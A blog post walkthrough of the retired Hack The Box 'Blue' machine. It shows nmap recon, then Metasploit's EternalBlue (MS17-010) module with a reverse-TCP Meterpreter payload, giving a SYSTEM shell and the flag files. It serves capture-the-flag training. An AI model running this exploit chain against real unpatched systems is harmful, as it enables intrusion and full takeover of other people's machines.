<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Blue - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,blue,windows-target,easy-box,user-own,system-own,retired,network,vulnerability-assessment,protocols,outdated-software,security-tools,metasploit,smb,reconnaissance,remote-code-execution,eternal-blue,cve-2017-0144"><meta name=description content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Blue machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/blue/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img_v1.1/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img_v1.1/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img_v1.1/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img_v1.1/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Blue - Walkthrough"><meta property="og:description" content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Blue machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/blue/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-03T08:00:00+00:00"><meta property="article:modified_time" content="2023-06-03T08:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Blue - Walkthrough"><meta name=twitter:description content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Blue machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Blue - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/blue/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Blue - Walkthrough","name":"HTB - Blue - Walkthrough","description":"SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.\nThe aim of this walkthrough is to provide help with the Blue machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.","keywords":["htb","walkthrough","blue","windows-target","easy-box","user-own","system-own","retired","network","vulnerability-assessment","protocols","outdated-software","security-tools","metasploit","smb","reconnaissance","remote-code-execution","eternal-blue","cve-2017-0144"],"articleBody":"SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.\nThe aim of this walkthrough is to provide help with the Blue machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out with finishing the Beginner-Track challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ Finally, a very simple and basic file structure used throughout this writeup for this particular pentest:\n1_recon –\u003e information gathering, enumeration and scanning, active/passive recon 2_exploitation –\u003e exploits, foothold, lateral movement 3_post-exploitation –\u003e privilege-escalation, lateral movement, persistence Generating it is can be done by the following one-liner:\nmkdir 1_recon; mkdir 2_exploitation; mkdir 3_post-exploitation INFORMATION-GATHERING As usual, we start out by a quick connection check\n# shell command ping -c 4 -n -R $rhost \u003e connection-test.txt # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.20]─[htb-bluewalle@htb-ysgugzuhsh]─[~/blue/1_recon] └──╼ [★]$ ping -c 4 -n -R $rhost \u003e connection-test.txt ┌─[eu-dedivip-1]─[10.10.14.20]─[htb-bluewalle@htb-ysgugzuhsh]─[~/blue/1_recon] └──╼ [★]$ cat connection-test.txt PING 10.129.174.73 (10.129.174.73) 56(124) bytes of data. 64 bytes from 10.129.174.73: icmp_seq=1 ttl=127 time=4.78 ms 64 bytes from 10.129.174.73: icmp_seq=2 ttl=127 time=3.46 ms 64 bytes from 10.129.174.73: icmp_seq=3 ttl=127 time=3.29 ms 64 bytes from 10.129.174.73: icmp_seq=4 ttl=127 time=3.08 ms --- 10.129.174.73 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3004ms rtt min/avg/max/mdev = 3.075/3.651/4.778/0.664 ms ┌─[eu-dedivip-1]─[10.10.14.20]─[htb-bluewalle@htb-ysgugzuhsh]─[~/blue/1_recon] └──╼ [★]$ followed by the usual(version, default scripts, top-ports) tcp scan.\n# shell command nmap -sV -sC -on nmap-service-defscripts-topports-scan $rhost # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.20]─[htb-bluewalle@htb-ysgugzuhsh]─[~/blue/1_recon] └──╼ [★]$ nmap -sV -sC -on nmap-service-defscripts-topports-scan $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 09:53 BST Failed to resolve \"nmap-service-defscripts-topports-scan\". Nmap scan report for 10.129.174.73 Host is up (0.068s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -19m57s, deviation: 34m37s, median: 0s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-03T09:54:40+01:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-03T08:54:41 |_ start_date: 2023-06-03T08:32:42 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.93 seconds ┌─[eu-dedivip-1]─[10.10.14.20]─[htb-bluewalle@htb-ysgugzuhsh]─[~/blue/1_recon] └──╼ [★]$ A couple of ports are reported open. One thing clearly stands out though:\n445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) or put simply, smb running on a quite old os.\nDoing a quick internet search for it’s reported vulnerabilities lands us with - MS17-010 EternalBlue - which is the famous EternalBlue exploit. The same exploit that was used by the WannaCry ransomware a couple of years back… and exploits CVE-2017-0144.\nSince there is already an exploit written for it in metasploit, so we simply continue from there on.\nEXPLOITATION Firing up metasploit\n# shell command msfconsole -q # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.20]─[htb-bluewalle@htb-ysgugzuhsh]─[~/blue/2_exploitation] └──╼ [★]$ msfconsole -q [msf](Jobs:0 Agents:0) \u003e\u003e and searching for the aforementioned exploit\n# msf command search ms17-010 eternalblue # terminal interaction [msf](Jobs:0 Agents:0) \u003e\u003e search ms17-010 eternalblue Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce [msf](Jobs:0 Agents:0) \u003e\u003e provides us with some options. The one we will be using here is the most common one for EternalBlue, which is available at - exploit/windows/smb/ms17_010_eternalblue -. Selecting it,\n# msf command use 0 [msf](Jobs:0 Agents:0) \u003e\u003e use 0 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e # terminal interaction and querying the module for information helps us verify, that the exploit is indeed appropriate for our current case.\n# msf command info # terminal interaction [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e info Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption Module: exploit/windows/smb/ms17_010_eternalblue Platform: Windows Arch: x64 Privileged: Yes License: Metasploit Framework License (BSD) Rank: Average Disclosed: 2017-03-14 Provided by: Equation Group Shadow Brokers sleepya Sean Dillon Dylan Davis thelightcosine wvu agalway-r7 cdelafuente-r7 cdelafuente-r7 agalway-r7 Available targets: Id Name -- ---- =\u003e 0 Automatic Target 1 Windows 7 2 Windows Embedded Standard 7 3 Windows Server 2008 R2 4 Windows 8 5 Windows 8.1 6 Windows Server 2012 7 Windows 10 Pro 8 Windows 10 Enterprise Evaluation Check supported: Yes Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit. com/docs/using-metasploit/basics/using-metasploi t.html RPORT 445 yes The target port (TCP) SMBDomain no (Optional) The Windows domain to use for authent ication. Only affects Windows Server 2008 R2, Wi ndows 7, Windows Embedded Standard 7 target mach ines. SMBPass no (Optional) The password for the specified userna me SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Tar get. Only affects Windows Server 2008 R2, Window s 7, Windows Embedded Standard 7 target machines . VERIFY_TARGET true yes Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windo ws Embedded Standard 7 target machines. Payload information: Space: 2000 Description: This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads. References: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010 https://nvd.nist.gov/vuln/detail/CVE-2017-0143 https://nvd.nist.gov/vuln/detail/CVE-2017-0144 https://nvd.nist.gov/vuln/detail/CVE-2017-0145 https://nvd.nist.gov/vuln/detail/CVE-2017-0146 https://nvd.nist.gov/vuln/detail/CVE-2017-0147 https://nvd.nist.gov/vuln/detail/CVE-2017-0148 https://github.com/RiskSense-Ops/MS17-010 https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf https://www.exploit-db.com/exploits/42030 Also known as: ETERNALBLUE View the full module info with the info -d command. [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e Great, since it fits, all that’s left is to properly configure it and then run it. Listing the module’s options should help us with the configuration.\n# msf command # terminal interaction [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit .com/docs/using-metasploit/basics/using-metaspl oit.html RPORT 445 yes The target port (TCP) SMBDomain no (Optional) The Windows domain to use for authen tication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target m achines. SMBPass no (Optional) The password for the specified usern ame SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Ta rget. Only affects Windows Server 2008 R2, Wind ows 7, Windows Embedded Standard 7 target machi nes. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Win dows Embedded Standard 7 target machines. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 161.35.38.166 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e Looking at the default configuration, we can leave almost all the settings untouched, except of course, the target and local hosts settings.\nNow, we could of course specify our target host’s OS too, setting it to - OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) - which was reported earlier during port scanning, but the module ships with automatic architecture and os discovery, so why bother.\n# msf command set rhosts $rhost set lhost tun0 # terminal interaction [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e set rhosts 10.129.174.73 rhosts =\u003e 10.129.174.73 [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e set lhost tun0 lhost =\u003e 10.10.14.20 [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e Looks like everything is properly set up, so let’s run a quick check and see if our target is vulnerable or not.\n# msf command check # terminal interaction [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e check [*] 10.129.174.73:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.129.174.73:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.129.174.73:445 - Scanned 1 of 1 hosts (100% complete) [+] 10.129.174.73:445 - The target is vulnerable. [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e It appears that our target is indeed vulnerable, so we run our exploit.\n# msf command run # terminal interaction [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) \u003e\u003e run [*] Started reverse TCP handler on 10.10.14.20:4444 [*] 10.129.174.73:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.129.174.73:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.129.174.73:445 - Scanned 1 of 1 hosts (100% complete) [+] 10.129.174.73:445 - The target is vulnerable. [*] 10.129.174.73:445 - Connecting to target for exploitation. [+] 10.129.174.73:445 - Connection established for exploitation. [+] 10.129.174.73:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.129.174.73:445 - CORE raw buffer dump (42 bytes) [*] 10.129.174.73:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.129.174.73:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.129.174.73:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.129.174.73:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.129.174.73:445 - Trying exploit with 12 Groom Allocations. [*] 10.129.174.73:445 - Sending all but last fragment of exploit packet [*] 10.129.174.73:445 - Starting non-paged pool grooming [+] 10.129.174.73:445 - Sending SMBv2 buffers [+] 10.129.174.73:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.129.174.73:445 - Sending final SMBv2 buffers. [*] 10.129.174.73:445 - Sending last fragment of exploit packet! [*] 10.129.174.73:445 - Receiving response from exploit packet [+] 10.129.174.73:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.129.174.73:445 - Sending egg to corrupted connection. [*] 10.129.174.73:445 - Triggering free of corrupted buffer. [*] Sending stage (200774 bytes) to 10.129.174.73 [*] Meterpreter session 1 opened (10.10.14.20:4444 -\u003e 10.129.174.73:49158) at 2023-06-03 10:49:25 +0100 [+] 10.129.174.73:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.129.174.73:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.129.174.73:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= (Meterpreter 1)(C:\\Windows\\system32) \u003e A meterpreter session was successfully opened and we have a shell connection to our target. As we can see, we are logged in with the NT AUTHORITY\\SYSTEM account, which has the highest privileges on a a local windows system, it’s even more powerful that than the local admin account. Therefore, there is simply no need for any lateral movement or privilege escalation on our part, we already possess the privileges to access both of the flags.\n# msf command getuid # terminal interaction (Meterpreter 1)(C:\\Windows\\system32) \u003e getuid Server username: NT AUTHORITY\\SYSTEM (Meterpreter 1)(C:\\Windows\\system32) \u003e POST-EXPLOITATION All that’s left for us now is to find and grab both the user and the root flags. We drop into the system command shell, since traversing the directories on a windows system might seem easier via cmd.\n# msf command shell # terminal interaction (Meterpreter 1)(C:\\Windows\\system32) \u003e shell Process 1128 created. Channel 1 created. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003e Once we identify the local user account - haris -, we head over to his Desktop and grab the user flag.\n# msf command shell # terminal interaction C:\\Windows\\system32\u003e cd c:\\users\\ cd c:\\users\\ c:\\Users\u003edir dir Volume in drive C has no label. Volume Serial Number is BE92-053B Directory of c:\\Users 21/07/2017 07:56 . 21/07/2017 07:56 .. 21/07/2017 07:56 Administrator 14/07/2017 14:45 haris 12/04/2011 08:51 Public 0 File(s) 0 bytes 5 Dir(s) 2,694,017,024 bytes free c:\\Users\u003ecd haris\\desktop\\ cd haris\\desktop\\ c:\\Users\\haris\\Desktop\u003edir dir Volume in drive C has no label. Volume Serial Number is BE92-053B Directory of c:\\Users\\haris\\Desktop 24/12/2017 03:23 . 24/12/2017 03:23 .. 03/06/2023 09:33 34 user.txt 1 File(s) 34 bytes 2 Dir(s) 2,694,017,024 bytes free c:\\Users\\haris\\Desktop\u003etype user.txt type user.txt c:\\Users\\haris\\Desktop\u003e Grabbing the root flag is even easier, we already know that it is usually sitting on the Administrator’s Desktop.\n# msf command type c:\\users\\administrator\\desktop\\root.txt # terminal interaction c:\\Users\\haris\\Desktop\u003e cd c:\\users\\administrator\\desktop cd c:\\users\\administrator\\desktop c:\\Users\\Administrator\\Desktop\u003edir dir Volume in drive C has no label. Volume Serial Number is BE92-053B Directory of c:\\Users\\Administrator\\Desktop 24/12/2017 03:22 . 24/12/2017 03:22 .. 03/06/2023 09:33 34 root.txt 1 File(s) 34 bytes 2 Dir(s) 2,694,017,024 bytes free c:\\Users\\Administrator\\Desktop\u003etype root.txt type root.txt c:\\Users\\Administrator\\Desktop\u003e With this, we just successfully pwned the target machine, congratulations. All that’s left for us now is to submit the flags and then terminate the target box (if not terminated already)!\n","wordCount":"2453","inLanguage":"en","datePublished":"2023-06-03T08:00:00Z","dateModified":"2023-06-03T08:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/blue/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img_v1.1/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Blue - Walkthrough</h1><div class=post-meta><span title='2023-06-03 08:00:00 +0000 +0000'>June, 2023</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2453 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#synopsis><strong>SYNOPSIS</strong></a></li><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#information-gathering><strong>INFORMATION-GATHERING</strong></a></li><li><a href=#exploitation><strong>EXPLOITATION</strong></a></li><li><a href=#post-exploitation><strong>POST-EXPLOITATION</strong></a></li></ul></nav></div></details></div><div class=post-content><h2 id=synopsis><strong>SYNOPSIS</strong><a hidden class=anchor aria-hidden=true href=#synopsis>#</a></h2><p>Outlining the <strong>attack path</strong> demonstrated in this <strong>writeup</strong> is much easier through a picture rather than a description, since <strong>a picture is worth a thousand words</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/blue/attack-path_blue.png alt="Attack Path - Blue" title="Attack Path - Blue"></p><p>The aim of this walkthrough is to provide help with the <a href=https://app.hackthebox.com/machines/51 title=Blue>Blue</a> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out with finishing the <a href=https://app.hackthebox.com/tracks/Beginner-Track title=Beginner-Track>Beginner-Track</a> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Finally, a very simple and basic <strong>file structure</strong> used throughout this <strong>writeup</strong> for this particular <strong>pentest</strong>:</p><ul><li>1_recon &ndash;> information gathering, enumeration and scanning, active/passive recon</li><li>2_exploitation &ndash;> exploits, foothold, lateral movement</li><li>3_post-exploitation &ndash;> privilege-escalation, lateral movement, persistence</li></ul><p><strong>Generating it</strong> is can be done by the following <strong>one-liner</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir 1_recon<span class=p>;</span> mkdir 2_exploitation<span class=p>;</span> mkdir 3_post-exploitation
